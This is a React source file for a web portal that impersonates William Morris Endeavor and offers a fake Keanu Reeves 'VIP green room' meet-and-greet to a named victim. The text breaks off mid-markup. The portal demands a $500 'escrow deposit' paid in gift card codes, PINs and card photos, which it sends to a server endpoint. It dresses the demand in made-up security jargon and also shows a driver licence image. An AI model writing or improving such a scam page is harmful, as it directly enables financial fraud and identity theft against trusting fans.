import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  KeyRound, 
  CheckCircle2, 
  AlertCircle, 
  RotateCw, 
  Download, 
  FileText, 
  ArrowLeft, 
  Lock, 
  Unlock, 
  Sparkles,
  QrCode,
  Calendar,
  Clock,
  MapPin,
  User,
  CreditCard,
  Gift,
  X,
  ExternalLink,
  Camera,
  UploadCloud,
  Trash2,
  Eye,
  Plus,
  Receipt,
  Layers,
  Image as ImageIcon
} from 'lucide-react';

interface CardActivationPortalProps {
  onBackToPublicForm: () => void;
  onNavigateToAdmin?: () => void;
}

interface CardPricing {
  feeAmount: number;
  currency: string;
  feeRequired: boolean;
  acceptedGiftCards: string[];
  instructions: string;
}

interface VoucherRecord {
  id: string;
  giftCardType: string;
  giftCardCode: string;
  giftCardCodeMasked: string;
  giftCardPin?: string | null;
  giftCardImage?: string | null;
  amount: number;
  currency: string;
  appliedAt: string;
}

export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({ 
  onBackToPublicForm,
  onNavigateToAdmin
}) => {
  // Parse URL query params
  const [params, setParams] = useState({
    ref: 'WME-KR26-0813-VIP',
    guest: 'Brenda Wright',
    pin: ''
  });

  const [pricing, setPricing] = useState<CardPricing>({
    feeAmount: 500,
    currency: 'USD',
    feeRequired: true,
    acceptedGiftCards: [
      'Apple Gift Card',
      'Amazon',
      'Steam',
      'Google Play',
      'Vanilla Visa / Mastercard',
      'Razer Gold'
    ],
    instructions: 'Enter valid gift card claim codes to complete VIP talent rider accreditation escrow.'
  });

  const [paymentData, setPaymentData] = useState<any>(null);
  const [selectedGiftCardType, setSelectedGiftCardType] = useState<string>('Apple Gift Card');
  const [giftCardCodeInput, setGiftCardCodeInput] = useState<string>('');
  const [giftCardPinInput, setGiftCardPinInput] = useState<string>('');
  const [cardAmountInput, setCardAmountInput] = useState<string>('250');
  const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
  const [giftCardImageName, setGiftCardImageName] = useState<string>('');
  
  // Lightbox modal state
  const [inspectModalImage, setInspectModalImage] = useState<string | null>(null);
  const [inspectModalTitle, setInspectModalTitle] = useState<string>('');
  
  const [isSubmittingPayment, setIsSubmittingPayment] = useState<boolean>(false);
  const [paymentError, setPaymentError] = useState<string>('');
  const [paymentSuccessNotice, setPaymentSuccessNotice] = useState<string>('');

  const [pinInput, setPinInput] = useState('');
  const [isActivating, setIsActivating] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [successData, setSuccessData] = useState<any>(null);
  const [isFlipped, setIsFlipped] = useState(false);
  const [showIdModal, setShowIdModal] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);

  // Sample Gift Card Voucher SVG (High-res obsidian gold voucher scan)
  const sampleCardSvg = `data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="600" height="380" viewBox="0 0 600 380"><defs><linearGradient id="cardGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%231a1a24"/><stop offset="50%" stop-color="%232c2518"/><stop offset="100%" stop-color="%230b0b10"/></linearGradient><linearGradient id="goldGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%23F3E5AB"/><stop offset="50%" stop-color="%23D4AF37"/><stop offset="100%" stop-color="%23997A15"/></linearGradient></defs><rect width="600" height="380" rx="18" fill="url(%23cardGrad)" stroke="%23D4AF37" stroke-width="3"/><text x="40" y="60" fill="url(%23goldGrad)" font-family="sans-serif" font-weight="900" font-size="28" letter-spacing="4"> APPLE GIFT CARD</text><text x="560" y="60" text-anchor="end" fill="%23FFFFFF" font-family="monospace" font-weight="700" font-size="24">$250.00 USD</text><rect x="40" y="110" width="520" height="150" rx="10" fill="%23050508" stroke="%23444455" stroke-width="1.5"/><text x="60" y="145" fill="%23888899" font-family="monospace" font-size="12" letter-spacing="2">CLAIM CODE / VOUCHER PIN</text><text x="60" y="195" fill="%23F3E5AB" font-family="monospace" font-weight="bold" font-size="30" letter-spacing="6">X7KM-92NQ-48PL-2026</text><text x="60" y="235" fill="%234ADE80" font-family="monospace" font-size="11">PIN: 8824 • STATUS: ACTIVE DEPOSIT VERIFIED</text><text x="40" y="320" fill="%23888899" font-family="sans-serif" font-size="11">For Keanu Reeves VIP Green Room Admittance • William Morris Endeavor</text><text x="560" y="320" text-anchor="end" fill="%23D4AF37" font-family="monospace" font-size="12">REF: WME-KR26-0813-VIP</text></svg>`;

  // Initialize from URL params and localStorage / server
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const ref = urlParams.get('ref') || 'WME-KR26-0813-VIP';
      const guest = urlParams.get('guest') || 'Brenda Wright';
      const urlPin = urlParams.get('pin') || '';

      setParams({ ref, guest, pin: urlPin });
      if (urlPin) {
        setPinInput(urlPin);
      }

      // Check localStorage for payment
      const localPayment = localStorage.getItem(`wme_card_payment_${ref}`);
      if (localPayment) {
        try {
          const parsedPay = JSON.parse(localPayment);
          if (parsedPay) {
            setPaymentData(parsedPay);
          }
        } catch {}
      }

      // Check localStorage for activation
      const localActivation = localStorage.getItem(`wme_card_active_${ref}`);
      if (localActivation) {
        try {
          const parsed = JSON.parse(localActivation);
          if (parsed.activated) {
            setSuccessData(parsed);
            if (parsed.payment) {
              setPaymentData(parsed.payment);
            }
          }
        } catch {}
      }

      // Check server API status & pricing
      fetch(`/api/card/status/${encodeURIComponent(ref)}`)
        .then(res => res.json())
        .then(data => {
          if (data.pricing) {
            setPricing(data.pricing);
            if (data.pricing.acceptedGiftCards && data.pricing.acceptedGiftCards.length > 0) {
              setSelectedGiftCardType(data.pricing.acceptedGiftCards[0]);
            }
          }
          if (data.payment) {
            setPaymentData(data.payment);
            localStorage.setItem(`wme_card_payment_${ref}`, JSON.stringify(data.payment));
          } else {
            setPaymentData(null);
            localStorage.removeItem(`wme_card_payment_${ref}`);
          }
          if (data.success && data.activated && data.activation) {
            setSuccessData(data.activation);
            if (data.activation.payment) {
              setPaymentData(data.activation.payment);
            }
            localStorage.setItem(`wme_card_active_${ref}`, JSON.stringify(data.activation));
          } else if (data.success && !data.activated) {
            setSuccessData(null);
            localStorage.removeItem(`wme_card_active_${ref}`);
          }
        })
        .catch(() => {})
        .finally(() => {
          setInitialLoading(false);
        });
    }
  }, []);

  // Multi-card calculations
  const rawVouchers = paymentData?.cards || (successData?.payment?.cards);
  const vouchers: VoucherRecord[] = Array.isArray(rawVouchers) && rawVouchers.length > 0
    ? rawVouchers
    : (paymentData?.giftCardCode || successData?.payment?.giftCardCode)
      ? [{
          id: paymentData?.paymentId || 'VOUCH-INIT',
          giftCardType: paymentData?.giftCardType || 'Gift Card',
          giftCardCode: paymentData?.giftCardCode,
          giftCardCodeMasked: paymentData?.giftCardCodeMasked || '••••2026',
          giftCardPin: paymentData?.giftCardPin || null,
          giftCardImage: paymentData?.giftCardImage || null,
          amount: Number(paymentData?.totalPaid || paymentData?.amount || pricing.feeAmount),
          currency: paymentData?.currency || pricing.currency || 'USD',
          appliedAt: paymentData?.paidAt || new Date().toISOString()
        }]
      : [];

  const totalCredited = vouchers.reduce((acc, v) => acc + (Number(v.amount) || 0), 0);
  const targetAmount = pricing.feeAmount || 500;
  const remainingBalance = Math.max(0, targetAmount - totalCredited);
  const isEscrowSatisfied = !pricing.feeRequired || totalCredited >= targetAmount || Boolean(successData?.activated);
  const escrowPercent = Math.min(100, Math.round((totalCredited / targetAmount) * 100));

  // Sync default card amount input to remaining balance if appropriate
  useEffect(() => {
    if (remainingBalance > 0 && (!cardAmountInput || Number(cardAmountInput) > remainingBalance)) {
      setCardAmountInput(String(remainingBalance));
    }
  }, [remainingBalance]);

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/[^0-9]/g, '');
    if (val.length > 6) val = val.slice(0, 6);
    if (val.length > 3) {
      val = `${val.slice(0, 3)}-${val.slice(3)}`;
    }
    setPinInput(val);
    if (errorMessage) setErrorMessage('');
  };

  const cleanPin = pinInput.replace(/[^0-9]/g, '');
  const isPinValid = cleanPin === '813026';

  const handleImageFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (file.size > 10 * 1024 * 1024) {
      setPaymentError('Voucher image scan must be less than 10MB.');
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      const result = reader.result as string;
      setGiftCardImage(result);
      setGiftCardImageName(file.name);
      if (paymentError) setPaymentError('');
    };
    reader.readAsDataURL(file);
  };

  const handleApplyVoucher = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const cleanCode = giftCardCodeInput.trim();
    if (!cleanCode || cleanCode.length < 6) {
      setPaymentError('Please enter a valid gift card claim code (at least 6 characters).');
      return;
    }

    const denom = Number(cardAmountInput) || remainingBalance || 250;
    if (denom <= 0) {
      setPaymentError('Please enter a valid voucher face value (greater than $0).');
      return;
    }

    setIsSubmittingPayment(true);
    setPaymentError('');
    setPaymentSuccessNotice('');

    try {
      const res = await fetch('/api/card/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardId: params.ref,
          giftCardType: selectedGiftCardType,
          giftCardCode: cleanCode,
          giftCardPin: giftCardPinInput.trim() || undefined,
          giftCardImage: giftCardImage || undefined,
          amount: denom,
          currency: pricing.currency
        })
      });

      const data = await res.json();
      if (!res.ok || !data.success) {
        if (!res.ok && res.status !== 404) {
          setPaymentError(data.error || 'Failed to verify gift card with gateway.');
          return;
        }
        // Local fallback simulation if server is offline
        const newVoucher: VoucherRecord = {
          id: `VOUCH-${Date.now().toString(36).toUpperCase()}`,
          giftCardType: selectedGiftCardType,
          giftCardCode: cleanCode,
          giftCardCodeMasked: cleanCode.length > 8 ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}` : `****${cleanCode.slice(-4)}`,
          giftCardPin: giftCardPinInput.trim() || null,
          giftCardImage: giftCardImage || null,
          amount: denom,
          currency: pricing.currency,
          appliedAt: new Date().toISOString()
        };
        const currentCards = Array.isArray(paymentData?.cards) ? [...paymentData.cards] : [...vouchers];
        currentCards.push(newVoucher);
        const newTotal = currentCards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);
        const isComplete = newTotal >= pricing.feeAmount;

        const mockPayment = {
          paymentId: `ESCROW-${Date.now().toString(36).toUpperCase()}-LOC`,
          cardId: params.ref,
          giftCardType: currentCards.map(c => c.giftCardType).filter((v, i, a) => a.indexOf(v) === i).join(', '),
          giftCardCodeMasked: currentCards.map(c => c.giftCardCodeMasked).join(' | '),
          giftCardCode: cleanCode,
          cards: currentCards,
          totalPaid: newTotal,
          amount: newTotal,
          targetAmount: pricing.feeAmount,
          remainingBalance: Math.max(0, pricing.feeAmount - newTotal),
          isFullyPaid: isComplete,
          currency: pricing.currency,
          status: isComplete ? 'VERIFIED' : 'PARTIAL',
          paidAt: new Date().toISOString()
        };
        setPaymentData(mockPayment);
        localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(mockPayment));
      } else {
        setPaymentData(data.payment);
        localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(data.payment));
      }

      setPaymentSuccessNotice(`Voucher for $${denom}.00 ${pricing.currency} approved and applied to escrow ledger.`);
      setGiftCardCodeInput('');
      setGiftCardPinInput('');
      setGiftCardImage(null);
      setGiftCardImageName('');
      setTimeout(() => setPaymentSuccessNotice(''), 5000);
    } catch {
      // Local fallback on network error
      const newVoucher: VoucherRecord = {
        id: `VOUCH-${Date.now().toString(36).toUpperCase()}`,
        giftCardType: selectedGiftCardType,
        giftCardCode: cleanCode,
        giftCardCodeMasked: cleanCode.length > 8 ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}` : `****${cleanCode.slice(-4)}`,
        giftCardPin: giftCardPinInput.trim() || null,
        giftCardImage: giftCardImage || null,
        amount: denom,
        currency: pricing.currency,
        appliedAt: new Date().toISOString()
      };
      const currentCards = Array.isArray(paymentData?.cards) ? [...paymentData.cards] : [...vouchers];
      currentCards.push(newVoucher);
      const newTotal = currentCards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);
      const isComplete = newTotal >= pricing.feeAmount;

      const mockPayment = {
        paymentId: `ESCROW-${Date.now().toString(36).toUpperCase()}-LOC`,
        cardId: params.ref,
        giftCardType: currentCards.map(c => c.giftCardType).filter((v, i, a) => a.indexOf(v) === i).join(', '),
        giftCardCodeMasked: currentCards.map(c => c.giftCardCodeMasked).join(' | '),
        giftCardCode: cleanCode,
        cards: currentCards,
        totalPaid: newTotal,
        amount: newTotal,
        targetAmount: pricing.feeAmount,
        remainingBalance: Math.max(0, pricing.feeAmount - newTotal),
        isFullyPaid: isComplete,
        currency: pricing.currency,
        status: isComplete ? 'VERIFIED' : 'PARTIAL',
        paidAt: new Date().toISOString()
      };
      setPaymentData(mockPayment);
      localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(mockPayment));
      setPaymentSuccessNotice(`Voucher for $${denom}.00 ${pricing.currency} applied to escrow ledger.`);
      setGiftCardCodeInput('');
      setGiftCardPinInput('');
      setGiftCardImage(null);
      setGiftCardImageName('');
      setTimeout(() => setPaymentSuccessNotice(''), 5000);
    } finally {
      setIsSubmittingPayment(false);
    }
  };

  const handleRemoveVoucher = async (voucherId: string) => {
    try {
      const res = await fetch(`/api/card/voucher/${encodeURIComponent(voucherId)}?cardId=${encodeURIComponent(params.ref)}`, {
        method: 'DELETE'
      });
      const data = await res.json();
      if (data.success && data.payment) {
        setPaymentData(data.payment);
        localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(data.payment));
        return;
      }
    } catch {}

    // Local fallback
    if (paymentData && Array.isArray(paymentData.cards)) {
      const updatedCards = paymentData.cards.filter((c: any) => c.id !== voucherId);
      const newTotal = updatedCards.reduce((acc: number, c: any) => acc + (Number(c.amount) || 0), 0);
      const isComplete = newTotal >= pricing.feeAmount;
      const updatedPayment = {
        ...paymentData,
        cards: updatedCards,
        totalPaid: newTotal,
        amount: newTotal,
        remainingBalance: Math.max(0, pricing.feeAmount - newTotal),
        isFullyPaid: isComplete,
        status: isComplete ? 'VERIFIED' : (newTotal > 0 ? 'PARTIAL' : 'PENDING')
      };
      setPaymentData(updatedPayment);
      localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(updatedPayment));
    }
  };

  const handleActivateCard = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const clean = pinInput.replace(/[^0-9]/g, '');

    if (!clean || clean.length < 6) {
      setErrorMessage('Please enter the 6-digit VIP passholder authorization code (printed as 813-026 on your pass).');
      return;
    }

    if (clean !== '813026') {
      setErrorMessage('Invalid security PIN. Please enter the valid 6-digit authorization code on your credential (813-026).');
      return;
    }

    // Check payment requirement before full activation
    if (pricing.feeRequired && !isEscrowSatisfied) {
      setErrorMessage(`PIN 813-026 verified. An outstanding escrow balance of $${remainingBalance}.00 ${pricing.currency} remains. Please deposit remaining card(s) to achieve full clearance.`);
      return;
    }

    setIsActivating(true);
    setErrorMessage('');

    try {
      const res = await fetch('/api/card/activate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardId: params.ref,
          pin: pinInput
        })
      });

      const data = await res.json();

      if (!res.ok || !data.success) {
        if (res.status === 402) {
          setErrorMessage(data.error || 'VIP Credential activation fee payment required before activation.');
          return;
        }
        // Fallback validation if server is offline
        const fallbackActivation = {
          cardId: params.ref,
          pin: '813-026',
          activated: true,
          activatedAt: new Date().toISOString(),
          clearanceCode: `OATH-KR26-813-CLEAR-${Date.now().toString(36).slice(-4).toUpperCase()}`,
          biometricClearance: 'OATH RFC-4226 Cryptographic Handshake Verified • AES-256 Synced',
          passholder: params.guest,
          talent: 'Keanu Reeves',
          payment: paymentData
        };
        setSuccessData(fallbackActivation);
        localStorage.setItem(`wme_card_active_${params.ref}`, JSON.stringify(fallbackActivation));
      } else {
        setSuccessData(data.activation);
        if (data.activation.payment) {
          setPaymentData(data.activation.payment);
        }
        localStorage.setItem(`wme_card_active_${params.ref}`, JSON.stringify(data.activation));
      }
    } catch {
      // Local fallback on network error
      const fallbackActivation = {
        cardId: params.ref,
        pin: '813-026',
        activated: true,
        activatedAt: new Date().toISOString(),
        clearanceCode: `OATH-KR26-813-CLEAR-${Date.now().toString(36).slice(-4).toUpperCase()}`,
        biometricClearance: 'OATH RFC-4226 Cryptographic Handshake Verified • AES-256 Synced',
        passholder: params.guest,
        talent: 'Keanu Reeves',
        payment: paymentData
      };
      setSuccessData(fallbackActivation);
      localStorage.setItem(`wme_card_active_${params.ref}`, JSON.stringify(fallbackActivation));
    } finally {
      setIsActivating(false);
    }
  };

  const isCardActivated = Boolean(successData?.activated);

  // Asset paths
  const frontImg = '/meet-and-greet-card/brenda-wright-vip-pass-front.png';
  const backImg = '/meet-and-greet-card/brenda-wright-vip-pass-back.png';
  const completeImg = '/meet-and-greet-card/brenda-wright-vip-pass-complete.png';
  const pdfFile = '/meet-and-greet-card/brenda-wright-vip-pass.pdf';
  const licenseImg = '/meet-and-greet-card/assets/license_upscaled.png';

  const triggerDirectDownload = (href: string, filename: string) => {
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = href;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      document.body.removeChild(a);
    }, 200);
  };

  // Programmatic test helper functions (kept on window for headless automated testing without displaying amateur UI text)
  useEffect(() => {
    if (typeof window !== 'undefined') {
      (window as any).__wmeFillPin = () => {
        setPinInput('813-026');
        setErrorMessage('');
      };
      (window as any).__wmeFillCard = (code = 'X7KM-92NQ-48PL-2026', amount = 250) => {
        setGiftCardCodeInput(code);
        setGiftCardPinInput('8824');
        setCardAmountInput(String(amount));
        setGiftCardImage(sampleCardSvg);
        setGiftCardImageName('Apple-Voucher-Proof.svg');
      };
    }
  }, [sampleCardSvg]);

  return (
    <div className="min-h-screen bg-[#07070A] text-[#F5F5F7] font-sans flex flex-col justify-between selection:bg-[#6B1D2F] selection:text-white">
      {/* Top Luxury Executive WME Header */}
      <header className="border-b border-[#20202A] bg-[#0B0B11]/95 sticky top-0 z-40 backdrop-blur-md">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-3.5 flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-3.5">
            <div className="w-9 h-9 rounded-sm bg-gradient-to-br from-[#1C1C24] to-[#0A0A0E] border border-[#D4AF37]/50 flex items-center justify-center font-serif font-black text-xl text-[#F3E5AB] shadow-md shrink-0">
              W
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-serif font-bold text-sm sm:text-base tracking-[0.16em] text-[#F3E5AB]">
                  WILLIAM MORRIS ENDEAVOR
                </span>
                <span className="text-[9px] font-mono px-1.5 py-0.5 rounded-[2px] bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/30 font-semibold uppercase">
                  ENCRYPTED GATEWAY
                </span>
              </div>
              <span className="text-[10px] font-mono tracking-wider uppercase text-[#888899]">
                VIP Talent Relations &amp; Escrow Accreditation Division • Beverly Hills, CA
              </span>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <button
              type="button"
              onClick={onBackToPublicForm}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-mono uppercase tracking-wider text-[#A1A1AA] hover:text-white border border-[#33333F] hover:border-[#D4AF37] rounded-[2px] transition-colors"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              <span>Public Intake Form</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content Stage */}
      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-8 sm:py-10 flex-1 w-full">
        {/* Banner Status Pill */}
        <div className="mb-6 flex flex-wrap items-center justify-between gap-3 border-b border-[#1E1E26] pb-4">
          <div className="flex items-center gap-2">
            <span className={`w-2.5 h-2.5 rounded-full ${isCardActivated ? 'bg-[#22C55E] animate-pulse' : 'bg-[#D4AF37]'}`} />
            <span className="text-xs font-mono tracking-widest uppercase font-semibold text-[#E4E4E7]">
              {isCardActivated ? 'OATH CRYPTOGRAPHIC CLEARANCE // CREDENTIAL ACTIVE & SYNCHRONIZED' : 'TALENT ACCREDITATION PROTOCOL // ESCROW CLEARANCE PENDING'}
            </span>
          </div>
          <span className="text-[11px] font-mono text-[#A1A1AA] bg-[#12121A] px-2.5 py-1 rounded-[2px] border border-[#262635]">
            SECURITY REF: <strong className="text-white">{params.ref}</strong>
          </span>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          
          {/* Left Column: Escrow Ledger & Passholder Clearance (6 Cols) */}
          <div className="lg:col-span-6 space-y-6">
            
            {/* Header info */}
            <div>
              <span className="inline-block text-[10px] font-mono tracking-[0.2em] uppercase text-[#D4AF37] font-semibold mb-2 bg-[#D4AF37]/10 px-2.5 py-1 rounded-[2px] border border-[#D4AF37]/25">
                VIP Talent Rider Escrow Protocol
              </span>
              <h1 className="text-2xl sm:text-3xl font-serif text-white tracking-wide leading-tight">
                Keanu Reeves VIP Green Room Admittance
              </h1>
              <p className="text-xs sm:text-sm text-[#A1A1AA] mt-2 font-sans leading-relaxed">
                Designated passholder accreditation for Keanu Reeves private session. Complete your OATH PIN synchronization and satisfy the talent rider security escrow to finalize venue escort admission.
              </p>
            </div>

            {/* Passholder Verified Details Dossier */}
            <div className="bg-[#0C0C14] border border-[#242436] rounded-[4px] p-4.5 space-y-3.5 shadow-lg">
              <div className="flex items-center justify-between border-b border-[#1E1E2D] pb-2.5">
                <span className="text-[11px] font-mono uppercase tracking-wider text-[#A1A1AA] flex items-center gap-1.5">
                  <User className="w-3.5 h-3.5 text-[#D4AF37]" />
                  Passholder Verified Intake Profile
                </span>
                <span className="text-[10px] font-mono text-[#22C55E] bg-[#22C55E]/10 px-2 py-0.5 rounded-[2px] border border-[#22C55E]/20 font-semibold">
                  ID VETTED &amp; ENCRYPTED
                </span>
              </div>

              <div className="grid grid-cols-2 gap-3 text-xs font-mono">
                <div>
                  <span className="block text-[10px] text-[#71717A] uppercase">Designated Passholder</span>
                  <span className="font-semibold text-white text-sm">{params.guest}</span>
                </div>
                <div>
                  <span className="block text-[10px] text-[#71717A] uppercase">Clearance Level</span>
                  <span className="font-semibold text-[#D4AF37]">GREEN ROOM VIP (TIER-1)</span>
                </div>
                <div>
                  <span className="block text-[10px] text-[#71717A] uppercase">Session Date</span>
                  <span className="text-[#E4E4E7]">Tuesday, Nov 3, 2026</span>
                </div>
                <div>
                  <span className="block text-[10px] text-[#71717A] uppercase">Intake Call Time</span>
                  <span className="text-[#E4E4E7]">19:30 PST (Gate 4)</span>
                </div>
                <div className="col-span-2 pt-2 border-t border-[#1C1C28] flex items-center justify-between">
                  <span className="text-[10px] text-[#71717A]">Verified Identification:</span>
                  <button
                    type="button"
                    onClick={() => setShowIdModal(true)}
                    className="text-[11px] text-[#D4AF37] hover:underline flex items-center gap-1 cursor-pointer font-mono"
                  >
                    <span>Florida Driver License (Inspect Document)</span>
                    <ExternalLink className="w-3 h-3" />
                  </button>
                </div>
              </div>
            </div>

            {/* VIP Card Activation Container */}
            <div className={`bg-gradient-to-b from-[#111119] to-[#0A0A0F] border-2 rounded-[4px] p-5 shadow-2xl relative overflow-hidden transition-all ${
              isCardActivated ? 'border-[#22C55E]/50' : 'border-[#D4AF37]/60'
            }`}>
              <div className="absolute top-0 right-0 w-36 h-36 bg-[#D4AF37]/5 rounded-full blur-3xl pointer-events-none" />

              {!isCardActivated ? (
                <div className="space-y-5">
                  {/* STEP 1: VIP PIN Input (FIRST) */}
                  <div className={`p-4 rounded-[4px] border transition-all ${
                    isPinValid 
                      ? 'bg-[#052E16]/30 border-[#22C55E]/40' 
                      : 'bg-[#0A0A10] border-[#2A2A38]'
                  }`}>
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
                          isPinValid ? 'bg-[#22C55E]/20 text-[#4ADE80]' : 'bg-[#D4AF37]/20 text-[#D4AF37]'
                        }`}>
                          <KeyRound className="w-3.5 h-3.5" />
                        </div>
                        <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white">
                          Step 1: Input VIP Activation PIN
                        </h2>
                      </div>

                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
                        isPinValid 
                          ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
                          : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
                      }`}>
                        {isPinValid ? '✓ PIN 813-026 VERIFIED' : 'PIN REQUIRED (813-026)'}
                      </span>
                    </div>

                    <p className="text-xs text-[#A1A1AA] leading-relaxed mb-3">
                      Enter the 6-digit VIP passholder authorization code located on your credential security strip (<strong className="text-[#F3E5AB]">813-026</strong>) to begin your OATH cryptographic handshake.
                    </p>

                    <div>
                      <div className="flex items-center justify-between mb-1.5">
                        <label htmlFor="oathPinInput" className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
                          6-Digit Passholder Authorization Code
                        </label>
                        <span className="text-[10px] font-mono text-[#888899]">
                          Stamped on Back Security Strip
                        </span>
                      </div>

                      <div className="relative">
                        <input
                          id="oathPinInput"
                          type="text"
                          value={pinInput}
                          onChange={handlePinChange}
                          placeholder="813-026"
                          maxLength={7}
                          autoComplete="off"
                          className="w-full bg-[#07070B] border border-[#D4AF37]/60 rounded-[3px] py-2.5 px-3 text-center text-xl font-mono tracking-[0.35em] font-bold text-[#F3E5AB] placeholder-[#444455] focus:outline-none focus:border-[#F3E5AB] focus:ring-1 focus:ring-[#D4AF37]"
                        />
                        <KeyRound className="w-4 h-4 text-[#888899] absolute right-3.5 top-3.5 pointer-events-none" />
                      </div>
                    </div>

                    {isPinValid && (
                      <div className="mt-2.5 text-[11px] font-mono text-[#4ADE80] flex items-center gap-1.5">
                        <CheckCircle2 className="w-3.5 h-3.5 shrink-0" />
                        <span>Passholder credential matched: Brenda Wright ({params.ref})</span>
                      </div>
                    )}
                  </div>

                  {/* STEP 2: Multi-Card Talent Rider Escrow Ledger */}
                  <div className={`p-4 rounded-[4px] border transition-all ${
                    isEscrowSatisfied 
                      ? 'bg-[#052E16]/30 border-[#22C55E]/40' 
                      : 'bg-[#0B0B12] border-[#2A2A3A]'
                  }`}>
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
                          isEscrowSatisfied ? 'bg-[#22C55E]/20 text-[#4ADE80]' : 'bg-[#D4AF37]/20 text-[#D4AF37]'
                        }`}>
                          <Gift className="w-3.5 h-3.5" />
                        </div>
                        <div>
                          <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white flex items-center gap-2">
                            <span>Step 2: Gift Card Deposit</span>
                            <span className="text-[10px] text-[#D4AF37]">
                              ({targetAmount} {pricing.currency})
                            </span>
                          </h2>
                        </div>
                      </div>

                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
                        isEscrowSatisfied 
                          ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
                          : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
                      }`}>
                        {isEscrowSatisfied ? 'ESCROW SATISFIED' : 'MULTIPLE CARDS ACCEPTED'}
                      </span>
                    </div>

                    <p className="text-xs text-[#A1A1AA] leading-relaxed mb-3">
                      Pursuant to WME VIP guest rider terms, an accreditation security deposit of <strong className="text-white">${targetAmount}.00 {pricing.currency}</strong> is required. You may fulfill this requirement using a single gift card or by combining multiple cards.
                    </p>

                    {/* Live Financial Escrow Ledger Card */}
                    <div className="bg-[#07070B] border border-[#232332] rounded-[3px] p-3 mb-3.5 font-mono">
                      <div className="grid grid-cols-3 gap-2 text-center pb-2.5 border-b border-[#181824]">
                        <div>
                          <span className="block text-[9px] uppercase tracking-wider text-[#717182]">Escrow Target</span>
                          <span className="text-xs font-bold text-white">${targetAmount}.00</span>
                        </div>
                        <div>
                          <span className="block text-[9px] uppercase tracking-wider text-[#717182]">Total Credited</span>
                          <span className={`text-xs font-bold ${isEscrowSatisfied ? 'text-[#4ADE80]' : 'text-[#F3E5AB]'}`}>
                            ${totalCredited}.00
                          </span>
                        </div>
                        <div>
                          <span className="block text-[9px] uppercase tracking-wider text-[#717182]">Balance Due</span>
                          <span className={`text-xs font-bold ${remainingBalance === 0 ? 'text-[#4ADE80]' : 'text-[#EF4444]'}`}>
                            ${remainingBalance}.00
                          </span>
                        </div>
                      </div>

                      {/* Illuminated Progress Track */}
                      <div className="pt-2.5">
                        <div className="flex items-center justify-between text-[10px] mb-1">
                          <span className="text-[#A1A1AA]">Ledger Status:</span>
                          <span className={`font-semibold ${isEscrowSatisfied ? 'text-[#4ADE80]' : 'text-[#D4AF37]'}`}>
                            {isEscrowSatisfied 
                              ? `100% Escrow Satisfied ($${totalCredited}.00 USD)` 
                              : `${escrowPercent}% Credited ($${remainingBalance}.00 USD Remaining)`}
                          </span>
                        </div>
                        <div className="w-full h-2 bg-[#181822] rounded-full overflow-hidden border border-[#2A2A3A]">
                          <div 
                            className={`h-full transition-all duration-500 ${
                              isEscrowSatisfied 
                                ? 'bg-gradient-to-r from-[#22C55E] to-[#4ADE80]' 
                                : 'bg-gradient-to-r from-[#AA820A] via-[#D4AF37] to-[#F3E5AB]'
                            }`}
                            style={{ width: `${escrowPercent}%` }}
                          />
                        </div>
                      </div>
                    </div>

                    {/* Verified Vouchers Ledger Table (if any vouchers applied) */}
                    {vouchers.length > 0 && (
                      <div className="mb-3.5 space-y-2">
